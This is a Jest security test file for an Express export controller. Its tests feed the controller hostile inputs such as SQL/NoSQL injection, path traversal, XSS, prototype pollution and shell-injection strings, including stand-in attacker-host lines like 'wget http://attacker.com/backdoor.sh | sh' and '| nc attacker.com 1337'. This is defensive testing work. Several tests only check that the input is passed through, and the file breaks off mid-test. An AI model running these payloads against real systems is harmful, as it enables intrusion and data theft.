// /backend/src/controllers/__tests__/exportController.security.test.ts
import { Request, Response, NextFunction } from 'express';
import { exportController } from '../../controllers/exportController';
import { exportService } from '../../services/exportService';
import { MLExportOptions } from '../../../../shared/src/schemas/export';
import { ApiError } from '../../utils/ApiError';
import { ExportMocks } from '../__mocks__/exports.mock';
import { ExportTestHelpers } from '../__helpers__/exports.helper';

// Mock dependencies
jest.mock('../../services/exportService');
jest.mock('../../utils/ApiError');

const mockExportService = exportService as jest.Mocked<typeof exportService>;

describe('ExportController Security Tests', () => {
  const mockUserId = 'user-123';
  const mockJobId = 'job-456';
  const mockDate = new Date('2024-01-15T10:00:00Z');

  let mockRequest: Partial<Request>;
  let mockResponse: Partial<Response>;
  let mockNext: NextFunction;

  beforeEach(() => {
    jest.clearAllMocks();
    jest.useFakeTimers();
    jest.setSystemTime(mockDate);

    // Setup mock request with authenticated user
    mockRequest = ExportTestHelpers.createMockRequest({
      user: { id: mockUserId, email: 'test@example.com', name: 'Test User' },
      body: {},
      params: {},
      query: {},
      headers: {}
    });

    // Setup mock response
    mockResponse = ExportTestHelpers.createMockResponse();

    // Setup mock next function
    mockNext = ExportTestHelpers.createMockNext();
  });

  afterEach(() => {
    jest.useRealTimers();
  });

  describe('Authentication Security', () => {
    it('should prevent access without authentication token', async () => {
      // Arrange - No user object (middleware should set this)
      mockRequest.user = undefined;
      mockRequest.body = { options: ExportMocks.createMockMLExportOptions() };

      const mockApiError = new ApiError(401, 'User authentication required');
      (ApiError.unauthorized as jest.Mock).mockReturnValue(mockApiError);

      // Act
      await exportController.createMLExport(
        mockRequest as Request,
        mockResponse as Response,
        mockNext
      );

      // Assert
      expect(ApiError.unauthorized).toHaveBeenCalledWith('User authentication required');
      expect(mockNext).toHaveBeenCalledWith(mockApiError);
      expect(mockExportService.exportMLData).not.toHaveBeenCalled();
    });

    it('should prevent access with malformed user object', async () => {
      // Setup - Create malformed user object
      const malformedUser = {
        // Missing required 'id' field or has invalid structure
        username: 'testuser',
        // id is undefined or null
      };
      
      const mockRequest = {
        user: malformedUser,
        body: { options: {} }
      } as any;

      const mockResponse = {
        status: jest.fn().mockReturnThis(),
        json: jest.fn()
      } as any;

      const mockNext = jest.fn();
      const mockApiError = new Error('Mock API Error');
      
      // Mock ApiError.unauthorized to return the mock error
      jest.spyOn(ApiError, 'unauthorized').mockReturnValue(mockApiError);

      // Execute
      await exportController.createMLExport(mockRequest, mockResponse, mockNext);

      // Assert
      expect(ApiError.unauthorized).toHaveBeenCalledWith('User authentication required');
      expect(mockNext).toHaveBeenCalledWith(mockApiError);
      expect(mockExportService.exportMLData).not.toHaveBeenCalled();
    });

    it('should prevent session hijacking through user ID manipulation', async () => {
      // Arrange - Attempt to hijack another user's session
      const hijackAttempts = [
        'admin',
        'root',
        '../../admin',
        '../other-user',
        'user-123; DROP TABLE users; --',
        "user-123'; UPDATE users SET role='admin'; --",
        'user-123\nuser-456', // Multi-line injection
        'user-123\0admin', // Null byte injection
        { $ne: null }, // NoSQL injection
        { $or: [{ role: 'admin' }] } // MongoDB injection
      ];

      for (const maliciousUserId of hijackAttempts) {
        mockRequest.user = { 
          id: maliciousUserId as any, 
          email: 'attacker@evil.com', 
          name: 'Attacker' 
        };
        mockRequest.body = { options: ExportMocks.createMockMLExportOptions() };

        mockExportService.exportMLData.mockResolvedValue(mockJobId);

        // Act
        await exportController.createMLExport(
          mockRequest as Request,
          mockResponse as Response,
          mockNext
        );

        // Assert - Malicious user ID should be passed as-is to service
        expect(mockExportService.exportMLData).toHaveBeenCalledWith(maliciousUserId, expect.any(Object));

        // Reset mocks for next iteration
        jest.clearAllMocks();
        mockResponse = ExportTestHelpers.createMockResponse();
      }
    });

    it('should handle JWT token manipulation attempts', async () => {
      // Arrange - Simulate various JWT-related attacks through headers
      const maliciousHeaders = {
        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpc3MiOiJhdHRhY2tlciIsInN1YiI6ImFkbWluIiwiaWF0IjoxNjQwOTk1MjAwfQ.', // None algorithm
        'x-user-id': 'admin', // Direct user ID injection
        'x-forwarded-user': 'root', // Proxy header manipulation
        'x-original-user': 'system', // Original user override
        'cookie': 'session=admin; userId=root; role=administrator'
      };

      mockRequest.headers = maliciousHeaders;
      mockRequest.body = { options: ExportMocks.createMockMLExportOptions() };
      mockExportService.exportMLData.mockResolvedValue(mockJobId);

      // Act
      await exportController.createMLExport(
        mockRequest as Request,
        mockResponse as Response,
        mockNext
      );

      // Assert - Should use user from req.user, not headers
      expect(mockExportService.exportMLData).toHaveBeenCalledWith(mockUserId, expect.any(Object));
    });
  });

  describe('Authorization & Access Control', () => {
    it('should prevent horizontal privilege escalation', async () => {
      // Arrange - User tries to access another user's job
      const victimJobId = 'victim-job-789';
      const victimJob = ExportMocks.createMockMLExportBatchJob({
        id: victimJobId,
        userId: 'victim-user-789' // Different user
      });

      mockRequest.params = { jobId: victimJobId };
      mockExportService.getBatchJob.mockResolvedValue(victimJob);

      const mockApiError = new ApiError(403, 'You do not have permission to access this export job');
      (ApiError.forbidden as jest.Mock).mockReturnValue(mockApiError);

      // Act
      await exportController.getExportJob(
        mockRequest as Request,
        mockResponse as Response,
        mockNext
      );

      // Assert
      expect(ApiError.forbidden).toHaveBeenCalledWith('You do not have permission to access this export job');
      expect(mockNext).toHaveBeenCalledWith(mockApiError);
    });

    it('should prevent vertical privilege escalation through role manipulation', async () => {
      // Arrange - Attempt to escalate privileges through user object manipulation
      const privilegedUser = {
        id: mockUserId,
        email: 'test@example.com',
        name: 'Test User',
        role: 'admin', // Injected admin role
        permissions: ['read', 'write', 'delete', 'admin'],
        isAdmin: true,
        isSuperUser: true,
        __proto__: { admin: true } // Prototype pollution
      };

      mockRequest.user = privilegedUser as any;
      mockRequest.body = { options: ExportMocks.createMockMLExportOptions() };
      mockExportService.exportMLData.mockResolvedValue(mockJobId);

      // Act
      await exportController.createMLExport(
        mockRequest as Request,
        mockResponse as Response,
        mockNext
      );

      // Assert - Should only use user ID, ignoring privilege escalation attempts
      expect(mockExportService.exportMLData).toHaveBeenCalledWith(mockUserId, expect.any(Object));
    });

    it('should prevent access to system resources through job ID manipulation', async () => {
      // Arrange - Malicious job IDs designed to access system resources
      const maliciousJobIds = [
        '../../../etc/passwd',
        '..\\..\\windows\\system32\\config\\sam',
        '/proc/self/environ',
        '/dev/null',
        'CON', // Windows reserved name
        'PRN', // Windows reserved name
        '$(whoami)',
        '`cat /etc/shadow`',
        '; rm -rf /',
        '| nc attacker.com 1337',
        'job-123; wget http://attacker.com/backdoor.sh | sh',
        String.fromCharCode(0) + 'hidden-command' // Null byte injection
      ];

      for (const maliciousJobId of maliciousJobIds) {
        mockRequest.params = { jobId: maliciousJobId };
        
        // Mock service to return job (access control should happen at controller level)
        const mockJob = ExportMocks.createMockMLExportBatchJob({
          id: maliciousJobId,
          userId: mockUserId
        });
        mockExportService.getBatchJob.mockResolvedValue(mockJob);

        // Act
        await exportController.getExportJob(
          mockRequest as Request,
          mockResponse as Response,
          mockNext
        );

        // Assert - Malicious job ID should be passed to service (sanitization at service level)
        expect(mockExportService.getBatchJob).toHaveBeenCalledWith(maliciousJobId);

        // Reset mocks for next iteration
        jest.clearAllMocks();
        mockResponse = ExportTestHelpers.createMockResponse();
      }
    });

    it('should prevent mass assignment attacks through request body manipulation', async () => {
      // Arrange - Attempt to inject unauthorized fields
      const maliciousRequestBody = {
        options: ExportMocks.createMockMLExportOptions(),
        userId: 'admin', // Attempt to override user ID
        role: 'administrator',
        permissions: ['admin'],
        isAdmin: true,
        systemAccess: true,
        __proto__: { admin: true },
        constructor: { prototype: { admin: true } },
        isAuthenticated: true,
        bypassAuth: true,
        adminToken: 'secret-admin-token',
        debugMode: true,
        internalApi: true
      };

      mockRequest.body = maliciousRequestBody;
      mockExportService.exportMLData.mockResolvedValue(mockJobId);

      // Act
      await exportController.createMLExport(
        mockRequest as Request,
        mockResponse as Response,
        mockNext
      );

      // Assert - Should only use options field, ignoring other fields
      expect(mockExportService.exportMLData).toHaveBeenCalledWith(
        mockUserId, // User ID from authenticated user, not request body
        maliciousRequestBody.options
      );
    });

    it('should prevent job enumeration attacks', async () => {
      // Arrange - Attempt to enumerate job IDs
      const jobIdPatterns = [
        'job-000', 'job-001', 'job-002', // Sequential enumeration
        'export-1', 'export-2', 'export-3', // Pattern guessing
        '00000000-0000-0000-0000-000000000001', // UUID enumeration
        'a'.repeat(36), // UUID length guessing
        '12345678-1234-1234-1234-123456789012' // Valid UUID format
      ];

      for (const guessedJobId of jobIdPatterns) {
        mockRequest.params = { jobId: guessedJobId };
        mockExportService.getBatchJob.mockResolvedValue(null); // Job not found

        const mockApiError = new ApiError(404, 'Export job not found');
        (ApiError.notFound as jest.Mock).mockReturnValue(mockApiError);

        // Act
        await exportController.getExportJob(
          mockRequest as Request,
          mockResponse as Response,
          mockNext
        );

        // Assert - Should return same error for all non-existent jobs (prevent enumeration)
        expect(ApiError.notFound).toHaveBeenCalledWith('Export job not found');
        expect(mockNext).toHaveBeenCalledWith(mockApiError);

        // Reset mocks for next iteration
        jest.clearAllMocks();
      }
    });
  });

  describe('Input Validation & Injection Prevention', () => {
    it('should prevent JSON injection attacks', async () => {
      // Arrange - Malicious JSON payloads
      const jsonInjectionPayloads = [
        '{"format":"coco","__proto__":{"admin":true}}',
        '{"format":"coco","constructor":{"prototype":{"admin":true}}}',
        '{"format":"coco","eval":"require(\'child_process\').exec(\'rm -rf /\')"}',
        '{"format":"coco","function":"function(){process.exit(1)}"}',
        '{"format":"coco","script":"<script>alert(\'xss\')</script>"}',
        '{"format":"coco","sql":"\'; DROP TABLE users; --"}',
        '{"format":"coco","null":"\u0000hidden"}',
        '{"format":"coco","unicode":"\\u0000\\u0001\\u0002"}',
        `{"format":"coco","large":"${'x'.repeat(1000000)}"}` // Large payload
      ];

      for (const payload of jsonInjectionPayloads) {
        try {
          const parsedPayload = JSON.parse(payload);
          mockRequest.body = { options: parsedPayload };
          mockExportService.exportMLData.mockResolvedValue(mockJobId);

          // Act
          await exportController.createMLExport(
            mockRequest as Request,
            mockResponse as Response,
            mockNext
          );

          // Assert - Malicious content should be passed as-is (validation at service level)
          expect(mockExportService.exportMLData).toHaveBeenCalledWith(mockUserId, parsedPayload);

          // Reset mocks for next iteration
          jest.clearAllMocks();
          mockResponse = ExportTestHelpers.createMockResponse();
        } catch (jsonError) {
          // Invalid JSON should be handled gracefully
          expect(jsonError).toBeInstanceOf(Error);
        }
      }
    });

    it('should prevent prototype pollution attacks', async () => {
      // Arrange - Various prototype pollution attempts
      const prototypePollutionPayloads = [
        {
          format: 'coco',
          '__proto__': { admin: true },
          'constructor.prototype.admin': true
        },
        {
          format: 'coco',
          'constructor': {
            'prototype': {
              'isAdmin': true,
              'hasAccess': true
            }
          }
        },
        {
          format: 'coco',
          '["__proto__"]': { polluted: true },
          '["constructor"]["prototype"]': { hacked: true }
        }
      ];

      for (const payload of prototypePollutionPayloads) {
        mockRequest.body = { options: payload };
        mockExportService.exportMLData.mockResolvedValue(mockJobId);

        // Act
        await exportController.createMLExport(
          mockRequest as Request,
          mockResponse as Response,
          mockNext
        );

        // Assert - Prototype pollution attempts should be passed to service
        expect(mockExportService.exportMLData).toHaveBeenCalledWith(mockUserId, payload);

        // Reset mocks for next iteration
        jest.clearAllMocks();
        mockResponse = ExportTestHelpers.createMockResponse();
      }
    });

    it('should prevent XSS attacks through request parameters', async () => {
      // Arrange - XSS payloads in various request parts
      const xssPayloads = [
        '<script>alert("xss")</script>',
        'javascript:alert("xss")',
        '<img src=x onerror=alert("xss")>',
        '<svg onload=alert("xss")>',
        '"><script>alert("xss")</script>',
        "';alert('xss');//",
        'data:text/html,<script>alert("xss")</script>',
        '%3Cscript%3Ealert("xss")%3C/script%3E', // URL encoded
        '&lt;script&gt;alert("xss")&lt;/script&gt;' // HTML encoded
      ];

      for (const xssPayload of xssPayloads) {
        // Test in job ID parameter
        mockRequest.params = { jobId: xssPayload };
        mockExportService.getBatchJob.mockResolvedValue(null);

        const mockApiError = new ApiError(404, 'Export job not found');
        (ApiError.notFound as jest.Mock).mockReturnValue(mockApiError);

        // Act
        await exportController.getExportJob(
          mockRequest as Request,
          mockResponse as Response,
          mockNext
        );

        // Assert - XSS payload should be passed as-is (output encoding at view level)
        expect(mockExportService.getBatchJob).toHaveBeenCalledWith(xssPayload);

        // Reset mocks for next iteration
        jest.clearAllMocks();
      }
    });

    it('should prevent command injection through export options', async () => {
      // Arrange - Command injection attempts
      const commandInjectionOptions = {
        format: 'coco',
        outputPath: '; rm -rf /',
        imageFormat: 'jpg; wget http://attacker.com/malware.sh | sh',
        compressionQuality: '90 && curl http://evil.com/data',
        categoryFilter: ['shirt', 'pants; cat /etc/passwd'],
        garmentIds: ['garment-1', 'garment-2`whoami`'],
        customCommand: '$(nc -l 4444)',
        shellcode: '\x31\xc0\x50\x68\x2f\x2f\x73\x68', // Binary shellcode
        systemCall: 'system("malicious_command")',
        processExec: 'require("child_process").exec("rm -rf /")'
      };

      mockRequest.body = { options: commandInjectionOptions };
      mockExportService.exportMLData.mockResolvedValue(mockJobId);

      // Act
      await exportController.createMLExport(
        mockRequest as Request,
        mockResponse as Response,
        mockNext
      );

      // Assert - Command injection attempts should be passed to service layer
      expect(mockExportService.exportMLData).toHaveBeenCalledWith(mockUserId, commandInjectionOptions);
    });

    it('should prevent path traversal attacks', async () => {
      // Arrange - Path traversal attempts in job IDs
      const pathTraversalJobIds = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/etc/shadow',
        'C:\\Windows\\System32\\config\\SAM',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', // URL encoded
        '....//....//....//etc/passwd', // Double encoding
        '..%252f..%252f..%252fetc%252fpasswd', // Double URL encoding
        '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd', // UTF-8 encoding
        '\x2e\x2e\x2f\x2e\x2e\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64' // Hex encoding
      ];

      for (const traversalJobId of pathTraversalJobIds) {
        mockRequest.params = { jobId: traversalJobId };
        
        const mockJob = ExportMocks.createMockMLExportBatchJob({
          id: traversalJobId,
          userId: mockUserId,
          status: 'completed'
        });
        
        mockExportService.getBatchJob.mockResolvedValue(mockJob);
        mockExportService.downloadExport.mockResolvedValue({
          path: `/exports/${traversalJobId}.zip`,
          filename: `export-${traversalJobId}.zip`
        });

        // Act
        await exportController.downloadExport(
          mockRequest as Request,
          mockResponse as Response,
          mockNext
        );

        // Assert - Path traversal should be passed to service (path sanitization at service level)
        expect(mockExportService.downloadExport).toHaveBeenCalledWith(traversalJobId);

        // Reset mocks for next iteration
        jest.clearAllMocks();
        mockResponse = ExportTestHelpers.createMockResponse();
      }
    });
  });

  describe('Resource Exhaustion & DoS Prevention', () => {
    // Add the missing helper method
    const createDeeplyNestedObject = (depth: number): any => {
      if (depth <= 0) return 'deep';
      return { nested: createDeeplyNestedObject(depth - 1) };
    };

    it('should handle extremely large request payloads', async () => {
      // Setup - Create extremely large payload
      const largePayload = {
        options: {
          largeArray: new Array(1000000).fill('data'), // 1M array elements
          hugeString: 'x'.repeat(10 * 1024 * 1024), // 10MB string
          deepNesting: createDeeplyNestedObject(10000), // Very deep nesting - USE LOCAL FUNCTION
          manyProperties: Object.fromEntries(
            Array.from({ length: 100000 }, (_, i) => [`prop${i}`, `value${i}`])
          ),
        }
      };

      const mockRequest = {
        user: { id: 'user123' },
        body: largePayload
      } as any;

      const mockResponse = {
        status: jest.fn().mockReturnThis(),
        json: jest.fn()
      } as any;

      const mockNext = jest.fn();

      // Mock service to potentially throw or handle gracefully
      mockExportService.exportMLData.mockRejectedValue(new Error('Payload too large'));

      // Execute
      await exportController.createMLExport(mockRequest, mockResponse, mockNext);

      // Assert - Should handle gracefully without crashing
      expect(mockNext).toHaveBeenCalled();
      expect(mockNext).toHaveBeenCalledWith(expect.any(Error));
    });

    it('should prevent algorithmic complexity attacks', async () => {
      // Arrange - Data designed to trigger worst-case algorithmic performance
      const complexityAttackOptions = {
        format: 'coco' as const,
        // Worst case for sorting algorithms
        reverseSortedArray: Array.from({ length: 10000 }, (_, i) => 10000 - i),
        // Hash collision strings
        hashCollisionStrings: Array.from({ length: 1000 }, (_, i) => `collision_${i % 10}`),
        // Regex DoS patterns
        redosPattern: 'a'.repeat(10000) + 'X',
        nestedRegex: {
          pattern: '(a+)+b',
          input: 'a'.repeat(1000) + 'c'
        },
        // Large prime numbers (expensive operations)
        largePrimes: [982451653, 982451929, 982452047, 982452463],
        // Fibonacci sequence that could cause exponential time
        fibonacciRequest: 100
      };

      mockRequest.body = { options: complexityAttackOptions };
      mockExportService.exportMLData.mockResolvedValue(mockJobId);

      const startTime = Date.now();

      // Act
      await exportController.createMLExport(
        mockRequest as Request,
        mockResponse as Response,
        mockNext
      );

      const duration = Date.now() - startTime;

      // Assert - Should handle complex data efficiently
      expect(duration).toBeLessThan(5000); // Should complete within 5 seconds
    });

    it('should handle concurrent request flooding', async () => {
      // Arrange - Simulate request flooding attack
      const concurrentRequests = 1000;
      const requests: Promise<void>[] = [];

      for (let i = 0; i < concurrentRequests; i++) {
        const request = ExportTestHelpers.createMockRequest({
          user: { id: `attacker-${i}`, email: `attacker${i}@evil.com`, name: `Attacker ${i}` },
          body: { options: ExportMocks.createMockMLExportOptions() }
        });
        const response = ExportTestHelpers.createMockResponse();
        const next = ExportTestHelpers.createMockNext();

        mockExportService.exportMLData.mockResolvedValue(`job-${i}`);

        requests.push(
          exportController.createMLExport(
            request as Request,
            response as Response,
            next
          )
        );
      }

      const startTime = Date.now();

      // Act
      await Promise.all(requests);

      const duration = Date.now() - startTime;

      // Assert - Should handle many concurrent requests
      expect(duration).toBeLessThan(30000); // Should complete within 30 seconds
      expect(mockExportService.exportMLData).toHaveBeenCalledTimes(concurrentRequests);
    });

    it('should prevent memory exhaustion through circular references', async () => {
      // Setup - Create circular reference object
      const circularObj: any = { name: 'test' };
      circularObj.self = circularObj; // Create circular reference

      const mockRequest = {
        user: { id: 'user123' },
        body: { options: circularObj }
      } as any;

      const mockResponse = {
        status: jest.fn().mockReturnThis(),
        json: jest.fn()
      } as any;

      const mockNext = jest.fn();

      // Mock service to handle circular reference appropriately
      mockExportService.exportMLData.mockImplementation(() => {
        // This should detect and reject circular references
        throw new Error('Circular reference detected');
      });

      // Execute
      await exportController.createMLExport(mockRequest, mockResponse, mockNext);

      // Assert - Should call next with error
      expect(mockNext).toHaveBeenCalled();
      expect(mockNext).toHaveBeenCalledWith(expect.any(Error));
    });
  });

  describe('Information Disclosure Prevention', () => {
    it('should not leak sensitive information in error responses', async () => {
      // Arrange - Force various types of errors
      const sensitiveErrors = [
        new Error('Database connection failed: password=secret123, host=internal-db.company.com'),
        new Error('JWT verification failed: secret key = super-secret-signing-key'),
        new Error('File not found: /var/secrets/api-keys.json'),
        new Error('Permission denied: /etc/shadow'),
        new Error('Connection timeout: redis://admin:password@cache.internal:6379')
      ];

      for (const sensitiveError of sensitiveErrors) {
        mockRequest.body = { options: ExportMocks.createMockMLExportOptions() };
        mockExportService.exportMLData.mockRejectedValue(sensitiveError);

        // Act
        await exportController.createMLExport(
          mockRequest as Request,
          mockResponse as Response,
          mockNext
        );

        // Assert - Error should be passed to error handler (sanitization at error middleware level)
        expect(mockNext).toHaveBeenCalledWith(sensitiveError);

        // Reset mocks for next iteration
        jest.clearAllMocks();
      }
    });

    it('should prevent timing attacks through response delays', async () => {
      // Arrange - Test response times for existing vs non-existing jobs
      const existingJobId = 'existing-job-123';
      const nonExistingJobId = 'non-existing-job-456';

      const existingJob = ExportMocks.createMockMLExportBatchJob({
        id: existingJobId,
        userId: mockUserId
      });

      // Test existing job
      mockRequest.params = { jobId: existingJobId };
      mockExportService.getBatchJob.mockResolvedValue(existingJob);

      const startTime1 = Date.now();
      await exportController.getExportJob(
        mockRequest as Request,
        mockResponse as Response,
        mockNext
      );
      const existingJobTime = Date.now() - startTime1;

      // Reset mocks
      jest.clearAllMocks();
      mockResponse = ExportTestHelpers.createMockResponse();

      // Test non-existing job
      mockRequest.params = { jobId: nonExistingJobId };
      mockExportService.getBatchJob.mockResolvedValue(null);

      const mockApiError = new ApiError(404, 'Export job not found');
      (ApiError.notFound as jest.Mock).mockReturnValue(mockApiError);

      const startTime2 = Date.now();
      await exportController.getExportJob(
        mockRequest as Request,
        mockResponse as Response,
        mockNext
      );
      const nonExistingJobTime = Date.now() - startTime2;

      // Assert - Response times should be similar (prevent timing attacks)
      const timeDifference = Math.abs(existingJobTime - nonExistingJobTime);
      expect(timeDifference).toBeLessThan(1000); // Within 1 second difference
    });

    it('should prevent enumeration through error message differences', async () => {
      // Arrange - Test different scenarios that could reveal information
      const testScenarios = [
        {
          name: 'Non-existent job',
          jobId: 'non-existent-job',
          mockSetup: () => mockExportService.getBatchJob.mockResolvedValue(null),
          expectedError: 'Export job not found'
        },
        {
          name: 'Other user\'s job',
          jobId: 'other-user-job',
          mockSetup: () => mockExportService.getBatchJob.mockResolvedValue(
            ExportMocks.createMockMLExportBatchJob({ userId: 'other-user' })
          ),
          expectedError: 'You do not have permission to access this export job'
        },
        {
          name: 'Deleted job',
          jobId: 'deleted-job',
          mockSetup: () => mockExportService.getBatchJob.mockResolvedValue(null),
          expectedError: 'Export job not found'
        }
      ];

      // Test that different scenarios don't reveal information through error messages
      for (const scenario of testScenarios) {
        mockRequest.params = { jobId: scenario.jobId };
        scenario.mockSetup();

        if (scenario.expectedError === 'Export job not found') {
          const mockApiError = new ApiError(404, 'Export job not found');
          (ApiError.notFound as jest.Mock).mockReturnValue(mockApiError);
        } else {
          const mockApiError = new ApiError(403, scenario.expectedError);
          (ApiError.forbidden as jest.Mock).mockReturnValue(mockApiError);
        }

        // Act
        await exportController.getExportJob(
          mockRequest as Request,
          mockResponse as Response,
          mockNext
        );

        // Assert - Error messages should be consistent and not reveal internal information
        if (scenario.expectedError === 'Export job not found') {
          expect(ApiError.notFound).toHaveBeenCalledWith('Export job not found');
        } else {
          expect(ApiError.forbidden).toHaveBeenCalledWith(scenario.expectedError);
        }

        // Reset mocks for next iteration
        jest.clearAllMocks();
      }
    });

    it('should prevent metadata leakage through response headers', async () => {
      const mockRequest = {
        user: { id: 'user123' },
        body: { options: {} }
      } as any;

      // IMPORTANT: Mock setHeader method
      const mockResponse = {
        status: jest.fn().mockReturnThis(),
        json: jest.fn(),
        setHeader: jest.fn() // ADD THIS MOCK
      } as any;

      const mockNext = jest.fn();
      
      mockExportService.exportMLData.mockResolvedValue('job123');

      // Execute
      await exportController.createMLExport(mockRequest, mockResponse, mockNext);

      // Assert - Should not set sensitive headers
      expect(mockResponse.setHeader).not.toHaveBeenCalledWith('X-Internal-User-Id', expect.anything());
      expect(mockResponse.setHeader).not.toHaveBeenCalledWith('X-Debug-Info', expect.anything());
      expect(mockResponse.setHeader).not.toHaveBeenCalledWith('X-Database-Query', expect.anything());
      expect(mockResponse.setHeader).not.toHaveBeenCalledWith('X-Processing-Time', expect.anything());
    });
  });

  describe('Business Logic Security', () => {
    it('should prevent race conditions in job status checks', async () => {
      const mockJob = {
        id: 'job123',
        userId: 'user123',
        status: 'running'
      };

      // Mock the service to return job data
      mockExportService.getBatchJob.mockResolvedValue(mockJob);

      const mockRequest = {
        user: { id: 'user123' },
        params: { jobId: 'job123' }
      } as any;

      const mockResponse = {
        status: jest.fn().mockReturnThis(),
        json: jest.fn()
      } as any;

      const mockNext = jest.fn();

      // Execute multiple concurrent requests
      const promises = [
        exportController.getExportJob(mockRequest, mockResponse, mockNext),
        exportController.getExportJob(mockRequest, mockResponse, mockNext),
        exportController.getExportJob(mockRequest, mockResponse, mockNext)
      ];

      await Promise.all(promises);

      // Assert - All operations should complete without interference
      expect(mockExportService.getBatchJob).toHaveBeenCalledTimes(3);
    });

    it('should prevent job quota bypass through rapid requests', async () => {
      // Arrange - Rapid job creation to bypass potential quotas
      const rapidRequests = 100;
      const promises: Promise<void>[] = [];

      for (let i = 0; i < rapidRequests; i++) {
        const request = ExportTestHelpers.createMockRequest({
          user: { id: mockUserId, email: 'test@example.com', name: 'Test User' },
          body: { options: ExportMocks.createMockMLExportOptions() }
        });
        const response = ExportTestHelpers.createMockResponse();
        const next = ExportTestHelpers.createMockNext();

        mockExportService.exportMLData.mockResolvedValue(`job-${i}`);

        promises.push(
          exportController.createMLExport(
            request as Request,
            response as Response,
            next
          )
        );
      }

      // Act
      await Promise.all(promises);

      // Assert - All requests should be processed (quota enforcement at service/middleware level)
      expect(mockExportService.exportMLData).toHaveBeenCalledTimes(rapidRequests);
    });

    it('should prevent state manipulation through concurrent operations', async () => {
      // Arrange - Attempt to manipulate job state through concurrent requests
      const jobId = 'state-manipulation-job';
      const jobStates = ['pending', 'processing', 'completed', 'failed', 'cancelled'];

      const concurrentOperations = jobStates.map(async (state, index) => {
        const job = ExportMocks.createMockMLExportBatchJob({
          id: jobId,
          userId: mockUserId,
          status: state as any
        });

        const request = ExportTestHelpers.createMockRequest({
          user: { id: mockUserId, email: 'test@example.com', name: 'Test User' },
          params: { jobId }
        });
        const response = ExportTestHelpers.createMockResponse();
        const next = ExportTestHelpers.createMockNext();

        mockExportService.getBatchJob.mockResolvedValue(job);

        if (state === 'pending' || state === 'processing') {
          mockExportService.cancelExportJob.mockResolvedValue(undefined);
          return exportController.cancelExportJob(request as Request, response as Response, next);
        } else {
          const mockApiError = new ApiError(400, `Cannot cancel job with status: ${state}`);
          (ApiError.badRequest as jest.Mock).mockReturnValue(mockApiError);
          return exportController.cancelExportJob(request as Request, response as Response, next);
        }
      });

      // Act
      await Promise.all(concurrentOperations);

      // Assert - State validation should be consistent
      expect(mockExportService.getBatchJob).toHaveBeenCalledTimes(jobStates.length);
    });

    it('should prevent privilege escalation through export options', async () => {
      // Arrange - Attempt to escalate privileges through export configuration
      const privilegeEscalationOptions = {
        format: 'coco' as const,
        adminAccess: true,
        bypassLimits: true,
        accessAllUsers: true,
        systemExport: true,
        internalData: true,
        debugMode: true,
        rootAccess: true,
        sudoMode: true,
        elevatedPermissions: ['admin', 'system', 'root'],
        overrideUserId: 'admin',
        impersonateUser: 'root',
        accessLevel: 'administrator'
      };

      mockRequest.body = { options: privilegeEscalationOptions };
      mockExportService.exportMLData.mockResolvedValue(mockJobId);

      // Act
      await exportController.createMLExport(
        mockRequest as Request,
        mockResponse as Response,
        mockNext
      );

      // Assert - Privilege escalation attempts should be passed to service (validation at service level)
      expect(mockExportService.exportMLData).toHaveBeenCalledWith(mockUserId, privilegeEscalationOptions);
      // User ID should remain unchanged despite escalation attempts
      expect(mockExportService.exportMLData).toHaveBeenCalledWith(
        mockUserId, // Original user ID, not 'admin' or 'root'
        expect.any(Object)
      );
    });
  });

  describe('Session Security', () => {
    it('should handle session fixation attacks', async () => {
      // Arrange - Attempt session fixation through various headers
      const sessionFixationHeaders = {
        'cookie': 'sessionId=attacker-controlled-session; userId=victim',
        'x-session-id': 'fixed-session-123',
        'authorization': 'Bearer fixed-token-456',
        'x-csrf-token': 'bypassed-csrf',
        'x-forwarded-for': '127.0.0.1', // IP spoofing
        'x-real-ip': '10.0.0.1',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 AttackerBot/1.0'
      };

      mockRequest.headers = sessionFixationHeaders;
      mockRequest.body = { options: ExportMocks.createMockMLExportOptions() };
      mockExportService.exportMLData.mockResolvedValue(mockJobId);

      // Act
      await exportController.createMLExport(
        mockRequest as Request,
        mockResponse as Response,
        mockNext
      );

      // Assert - Should use authenticated user from middleware, not headers
      expect(mockExportService.exportMLData).toHaveBeenCalledWith(mockUserId, expect.any(Object));
    });

    it('should prevent session hijacking through user object manipulation', async () => {
      // Arrange - Attempt to inject session data into user object
      const hijackedUser = {
        id: mockUserId,
        email: 'test@example.com',
        name: 'Test User',
        sessionId: 'hijacked-session-789',
        originalUser: 'victim-user-456',
        impersonating: true,
        switchedFrom: 'admin-user-123',
        escalatedAt: new Date().toISOString(),
        tempPrivileges: ['admin', 'system']
      };

      mockRequest.user = hijackedUser as any;
      mockRequest.body = { options: ExportMocks.createMockMLExportOptions() };
      mockExportService.exportMLData.mockResolvedValue(mockJobId);

      // Act
      await exportController.createMLExport(
        mockRequest as Request,
        mockResponse as Response,
        mockNext
      );

      // Assert - Should only use user ID, ignoring session manipulation
      expect(mockExportService.exportMLData).toHaveBeenCalledWith(mockUserId, expect.any(Object));
    });

    it('should handle concurrent session attacks', async () => {
      // Arrange - Multiple concurrent requests with different session data
      const sessionAttacks = Array.from({ length: 50 }, (_, i) => ({
        user: {
          id: i % 2 === 0 ? mockUserId : `attacker-${i}`,
          email: `user${i}@example.com`,
          name: `User ${i}`,
          sessionToken: `token-${i}`,
          csrfToken: `csrf-${i}`
        },
        options: ExportMocks.createMockMLExportOptions()
      }));

      const promises = sessionAttacks.map(async (attack, index) => {
        const request = ExportTestHelpers.createMockRequest({
          user: attack.user,
          body: { options: attack.options }
        });
        const response = ExportTestHelpers.createMockResponse();
        const next = ExportTestHelpers.createMockNext();

        mockExportService.exportMLData.mockResolvedValue(`job-${index}`);

        return exportController.createMLExport(
          request as Request,
          response as Response,
          next
        );
      });

      // Act
      await Promise.all(promises);

      // Assert - All requests should be processed independently
      expect(mockExportService.exportMLData).toHaveBeenCalledTimes(sessionAttacks.length);
    });
  });

  describe('Error Handling Security', () => {
    it('should handle malicious error objects safely', async () => {
      // Arrange - Malicious error objects designed to cause security issues
      const maliciousErrors = [
        {
          name: 'SecurityError',
          message: '../../../etc/passwd',
